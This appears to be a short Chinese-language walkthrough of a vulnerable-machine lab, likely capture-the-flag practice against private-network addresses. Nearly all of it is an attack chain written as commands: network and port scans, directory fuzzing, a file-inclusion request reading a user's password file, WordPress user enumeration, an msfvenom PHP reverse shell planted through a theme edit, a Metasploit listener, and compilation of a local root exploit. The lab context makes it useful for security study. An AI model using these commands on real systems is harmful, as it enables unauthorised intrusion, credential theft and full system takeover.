# 主机发现
`nmap -sP 192.168.111.0/24`

# 端口扫描
`nmap -p- 192.168.111.129 -A`

# 目录扫描 指定后缀
`dirb http://192.168.111.129 -X .txt,.php,.zip`

# Fuzz 使用wfuzz
`wfuzz -c  -w /usr/share/wfuzz/wordlist/general/common.txt --hw 12  http://192.168.111.129/index.php?FUZZ`

# LFI 
`http://192.168.111.129/image.php?file=location.txt`
`http://192.168.111.129/image.php?secrettier360=/home/saket/password.txt`

# Wordpress 扫描 枚举用户
wpscan --url http://192.168.56.111/wordpress -e


# msf 生成反弹shell
`msfvenom -p php/meterpreter/reverse_tcp lhost=192.168.56.101 lport=7777 -f raw -o 1.php`
注意前面的注释/* 去掉

# 主题修改 上传php
寻找可编辑php

# msf 等待连接
```
msfconsole
use exploit/multi/handler
set payload/php/meterpreter/reverse_tcp
set lhost 1.1.1.1
set lport 7777
exploit
upload /tmp/45010 /tmp
shell # 交互shell
chmod a+x /tmp/45010
/tmp/45010
id
```

# 本地提权
```
getuid
sysinfo # 获取系统版本
```
```
msfconsole
searchsploit 16.04 ubuntu
# 根据版本号取得提权代码
gcc /usr/share/exploitdb/exploits/linux/local/45010.c -o /tmp/45010
```
